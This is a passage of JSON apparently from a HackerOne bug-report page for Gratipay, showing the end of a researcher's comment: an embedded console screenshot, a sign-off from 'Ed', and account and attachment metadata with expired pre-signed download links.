data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/196/025/b1689add7f8d909c3f498c5f86e09b6f997d30da/gratipay_console.PNG?response-content-disposition=attachment%3B%20filename%3D%22gratipay_console.PNG%22%3B%20filename%2A%3DUTF-8%27%27gratipay_console.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T050800Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026amp;X-Amz-Signature=7842bb90a017cb8fa8d77a22eb7eed8ac41b5fb700c537929cd5e17b7a876d0f\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/196/025/b1689add7f8d909c3f498c5f86e09b6f997d30da/gratipay_console.PNG?response-content-disposition=attachment%3B%20filename%3D%22gratipay_console.PNG%22%3B%20filename%2A%3DUTF-8%27%27gratipay_console.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T050800Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026amp;X-Amz-Signature=7842bb90a017cb8fa8d77a22eb7eed8ac41b5fb700c537929cd5e17b7a876d0f\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-21T09:05:01.578Z","updated_at":"2017-06-21T09:05:24.779Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":196025,"filename":"gratipay_console.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/196/025/b1689add7f8d909c3f498c5f86e09b6f997d30da/gratipay_console.PNG?response-content-disposition=attachment%3B%20filename%3D%22gratipay_console.PNG%22%3B%20filename%2A%3DUTF-8%27%27gratipay_console.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050800Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=7842bb90a017cb8fa8d77a22eb7eed8ac41b5fb700c537929cd5e17b7a876d0f"}],"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}